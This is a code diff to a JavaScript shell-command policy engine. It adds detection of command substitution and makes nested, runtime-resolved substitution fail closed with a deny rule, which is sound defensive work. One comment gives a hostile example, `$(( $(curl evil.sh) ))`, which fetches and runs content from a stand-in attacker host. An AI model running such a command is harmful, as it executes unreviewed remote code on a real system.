@@ -30,10 +30,57 @@ function normalizeText(value) {
   return JSON.stringify(value, null, 2);
 }
 
+// #1055 D4-17: recognize `$(...)` / backtick command substitution in command
+// stage inputs. `$(())` is shell arithmetic, not dynamic execution, and is
+// excluded so `echo $((1+1))` keeps its allow decision.
+const COMMAND_SUBSTITUTION_PATTERNS = [/\$\((?!\()([^)]*)\)/g, /`([^`]+)`/g];
+
+function extractSubstitutionCommands(command) {
+  const text = String(command || '');
+  const inner = [];
+  for (const pattern of COMMAND_SUBSTITUTION_PATTERNS) {
+    for (const match of text.matchAll(pattern)) {
+      if (match[1] && match[1].trim()) inner.push(match[1]);
+    }
+  }
+  return inner;
+}
+
+// Arithmetic shell `$(( ... ))` is not dynamic execution by itself
+// (`echo $((1+1))` stays allow), but arithmetic whose body itself embeds a
+// substitution (`$(( $(curl evil.sh) ))`) executes dynamic content at runtime
+// and must be treated as unresolvable: the flat `[^)]*` extraction cannot see
+// through the nested parens, so the nesting otherwise escapes detection
+// (#1055 D4-17 review follow-up).
+const ARITHMETIC_SHELL_RE = /\$\(\(([\s\S]*?)\)\)/g;
+
+function hasArithmeticShellSubstitution(command) {
+  const text = String(command || '');
+  for (const match of text.matchAll(ARITHMETIC_SHELL_RE)) {
+    const body = match[1] || '';
+    if (body.includes('$(') || body.includes('`')) return true;
+  }
+  return false;
+}
+
+// Nested substitution (a substitution whose payload itself contains `$(` or a
+// backtick) resolves only at runtime — no static rule can review what will
+// execute. The engine must fail closed on it instead of returning allow
+// (fail-open, #1055 D4-17).
+function hasUnresolvableSubstitution(command) {
+  if (hasArithmeticShellSubstitution(command)) return true;
+  const payloads = extractSubstitutionCommands(command);
+  return payloads.some((payload) => payload.includes('$(') || payload.includes('`'));
+}
+
 function evaluationContext(stage, input) {
   if (stage === 'command') {
     const command = normalizeText(input.command || input.text || '');
-    return { text: command, command };
+    // Feed the substituted payload to the rule catalog as its own line so
+    // rules inspect the dynamic execution content, not just the wrapper.
+    const inner = extractSubstitutionCommands(command);
+    const text = inner.length > 0 ? `${command}\n${inner.join('\n')}` : command;
+    return { text, command };
   }
   if (stage === 'artifact') {
     const path = String(input.path || '');
@@ -93,6 +140,27 @@ function evaluate(stage, inputs, options = {}) {
         severity: rule.severity,
         message: rule.message,
         remediation: rule.remediation,
+        source: input?.path || stage,
+        evidence: excerpt(context.text),
+      });
+    }
+    // #1055 D4-17: fail closed on command substitution whose payload resolves
+    // only at runtime — an unreviewable dynamic execution must not come back
+    // as "allow" just because no regex rule matched.
+    if (
+      stage === 'command' &&
+      hasUnresolvableSubstitution(context.command) &&
+      !findings.some((finding) => finding.severity === 'deny')
+    ) {
+      findings.push({
+        ruleId: 'hwc-command-substitution-exec',
+        title: 'Dynamic command substitution cannot be statically reviewed',
+        category: 'execution',
+        severity: 'deny',
+        message:
+          'The command nests command substitution; the executed payload resolves only at runtime, so no static rule can review what will execute.',
+        remediation:
+          'Expand nested command substitution into a reviewable file, inspect the content, and execute only explicit reviewed commands.',
         source: input?.path || stage,
         evidence: excerpt(context.text),
       });
